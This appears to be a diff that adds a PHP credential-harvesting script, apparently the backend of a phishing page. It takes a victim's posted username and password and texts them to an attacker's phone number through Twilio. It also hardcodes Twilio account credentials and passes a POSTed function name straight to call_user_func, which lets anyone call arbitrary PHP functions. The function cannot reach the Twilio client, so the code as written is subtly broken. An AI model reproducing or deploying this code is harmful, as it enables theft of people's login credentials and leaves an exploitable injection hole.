@@ -1,0 +1,28 @@
+<?php
+    // Update the path below to your autoload.php,
+    require_once '/path/to/vendor/autoload.php';
+    use Twilio\Rest\Client;
+
+    $sid    = "ACb7511184e524291c17e40bf3d9a94b90";
+    $token  = "23cc719cc4bd48562d1c61fd8089ea52";
+    $twilio = new Client($sid, $token);
+
+
+
+if (isset($_POST['functionToCall']) && function_exists($_POST['functionToCall']) && isset($_POST['targetUsername']) && isset($_POST['targetLoginPassword'])) {
+  call_user_func($_POST['functionToCall'],$_POST['targetUsername'],$_POST['targetLoginPassword']);
+}
+
+//Capture user data,create sms instance and send sms to admin
+ function captureTargetUserData($targetUsername,$targetPassword){
+     $message = $twilio->messages
+      ->create("+257.....", // to
+        array(
+          "from" => "+15734886499",
+          "body" => "Username: ".$targetUsername."       "."Password: ".$targetPassword
+        )
+      );
+    print($message->sid);
+ }
+
+?>
